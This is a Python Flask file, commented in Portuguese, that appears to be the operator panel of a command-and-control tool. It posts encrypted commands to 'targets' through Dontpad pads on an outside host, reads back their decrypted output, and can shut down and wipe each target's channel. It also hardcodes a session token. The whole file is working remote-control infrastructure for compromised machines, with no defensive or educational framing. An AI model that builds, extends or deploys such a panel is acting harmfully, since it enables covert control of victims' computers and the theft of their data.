# -*- coding: utf-8 -*-
import os
import time
from flask import Flask, request, jsonify, render_template
import requests
import sys
from flask_cors import CORS
import urllib.parse

parent_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, parent_dir)
from criptographer import Criptographer

# Configurações importantes para o Dontpad e a criptografia
DONTPAD_BASE_URL = "https://api.dontpad.com/yaguinhofodinha"
SESSION_TOKEN = "128007249672c60861c7"
USERS_URL = "https://api.dontpad.com/yaguinhofodinha.menu.json"

app = Flask(__name__)

# Nova rota para servir o arquivo HTML
@app.route('/')
def index():
    """
    Rota principal que renderiza a interface gráfica do usuário (GUI).
    O arquivo index.html deve estar dentro de uma pasta chamada 'templates'.
    """
    return render_template('index.html')

# Rota para buscar a lista de usuários
@app.route('/users', methods=['GET'])
def get_users():
    """
    Rota para buscar a lista de usuários da API do Dontpad e retornar ao front-end.
    Isso contorna o erro de CORS no navegador.
    """
    try:
        response = requests.get(USERS_URL)
        response.raise_for_status()
        return jsonify(response.json())
    except requests.exceptions.RequestException as e:
        return jsonify({"status": "error", "message": f"Erro ao buscar usuários do Dontpad: {e}"}), 500

@app.route('/send_command', methods=['POST'])
def send_command():
    """
    Rota para enviar um comando/mensagem criptografado para um usuário.
    Espera dados de formulário com 'user' e 'command'.
    A requisição é feita para a rota /request no Dontpad.
    """
    username = request.form.get('user')
    command = request.form.get('command')
    
    if not username or not command:
        return jsonify({"status": "error", "message": "Usuário ou comando ausente"}), 400

    try:
        
        data = {
            "text": Criptographer.encrypt(command, username),
            "lastModified": int(time.time() * 1000),
            "force": "true",
            "session-token": SESSION_TOKEN
        }
        
        response = requests.post(f"{DONTPAD_BASE_URL}/{username}/request", data=data)

        if response.status_code == 200:
            return jsonify({
                "status": "success",
                "message": f"Comando '{command}' enviado e criptografado para o alvo '{username}'.",
                "dontpad_status": response.status_code
            }), 200
        else:
            return jsonify({
                "status": "error",
                "message": "Falha ao postar no Dontpad.",
                "dontpad_status": response.status_code,
                "dontpad_response": response.text
            }), 500

    except Exception as e:
        return jsonify({"status": "error", "message": f"Erro interno de criptografia/requisição: {e}"}), 500

@app.route('/receive_message/<username>', methods=['GET'])
def receive_message(username):
    """
    Rota para receber e descriptografar a mensagem de um usuário.
    Espera o nome de usuário na URL. A requisição é feita para a rota /response no Dontpad.
    """
    try:
        # Constrói a URL para pegar o conteúdo em formato JSON com a nova rota /response
        url_with_username = (
            f"{DONTPAD_BASE_URL}/{username}/response.body.json"
            f"?lastModified=0&session-token={SESSION_TOKEN}"
        )
        
        response = requests.get(url_with_username)
        
        if response.status_code == 200:
            data = response.json()
            encrypted_body = data.get('body')

            if not encrypted_body:
                return jsonify({"status": "error", "message": "Nenhuma mensagem encontrada para o usuário."}), 404
            
            decrypted_message = Criptographer.decrypt(encrypted_body, username)
            
            return jsonify({
                "status": "success",
                "user": username,
                "message": "Mensagem recebida e descriptografada com sucesso.",
                "decrypted_message": decrypted_message
            }), 200
        else:
            return jsonify({
                "status": "error",
                "message": "Falha ao buscar a mensagem no Dontpad.",
                "dontpad_status": response.status_code,
                "dontpad_response": response.text
            }), 500

    except Exception as e:
        return jsonify({"status": "error", "message": f"Erro interno: {e}"}), 500

@app.route('/delete_user/<username>', methods=['GET'])
def delete_user(username):
    if username:
        response = requests.get(USERS_URL)
        if response.status_code == 200:
            users = response.json()
            username = urllib.parse.quote(username)
            print(users, username)
            if username in users:
                if perform_user_deletion(username):
                    return jsonify({"status": "success", "message": f"Usuário {username} deletado com sucesso."}), 200
                return jsonify({"status": "error", "message": f"Erro ao deletar usuário {username}."}), 404
            else:
                return jsonify({"status": "error", "message": f"Usuário {username} não encontrado."}), 404

def perform_user_deletion(username):
    data = {
        "text": Criptographer.encrypt('', username),
        "lastModified": int(time.time() * 1000),
        "force": "true",
        "session-token": SESSION_TOKEN
    }
    data_exit = {
        "text": Criptographer.encrypt('exit', username),
        "lastModified": int(time.time() * 1000),
        "force": "true",
        "session-token": SESSION_TOKEN
    }
    requests.post(f"{DONTPAD_BASE_URL}/{username}/request", data=data_exit)
    time.sleep(2)
    res_request = requests.post(f"{DONTPAD_BASE_URL}/{username}/request", data=data)
    res_response = requests.post(f"{DONTPAD_BASE_URL}/{username}/response", data=data)
    if res_response.status_code == 200 and res_request.status_code == 200:
        return True
    return False

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
    CORS(app)
